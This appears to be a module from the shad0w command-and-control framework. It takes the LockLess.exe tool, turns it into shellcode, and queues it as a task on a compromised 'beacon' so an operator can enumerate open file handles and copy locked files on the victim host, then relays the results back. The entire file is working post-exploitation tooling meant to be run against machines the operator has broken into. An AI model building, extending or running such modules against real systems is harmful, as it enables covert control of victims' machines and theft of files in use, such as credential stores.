#
# Execute lockless on a session
#

import argparse

from lib import shellcode

__description__ = "A tool that allows for the enumeration of open file handles and the copying of locked files"
__author__ = "@_batsec_, @harmj0y"

# beacon to exec command on
current_beacon = None

# identify the task as shellcode execute
USERCD_EXEC_ID = 0x3000

# location of lockless binary
LOCKLESS_BIN = "/root/shad0w/bin/SharpCollection/NetFramework_4.5_x86/LockLess.exe"

# little hack but lets us pass the args to donut
class DummyClass(object):
    def __init__(self):
        pass

def lockless_callback(shad0w, data):
    shad0w.event.beacon_info(current_beacon, data)

    return ""

def main(shad0w, args, beacon):
    global current_beacon

    # make beacon global
    current_beacon = beacon

    lockless_args = ' '.join(args[1:])

    # kinda a hack to make sure we intergrate nice with the shellcode generator
    args = DummyClass()

    if len(lockless_args) != 0:
        args.param = lockless_args
    else:
        args.param = False
        lockless_args = False

    args.cls = False
    args.method = False
    args.runtime = False
    args.appdomain = False

    b64_comp_data = shellcode.generate(LOCKLESS_BIN, args, lockless_args)

    # dont clear the callbacks, cause the reponse are chunked
    shad0w.clear_callbacks = False

    shad0w.beacons[current_beacon]["task"] = (USERCD_EXEC_ID, b64_comp_data)
    shad0w.beacons[current_beacon]["callback"] = lockless_callback
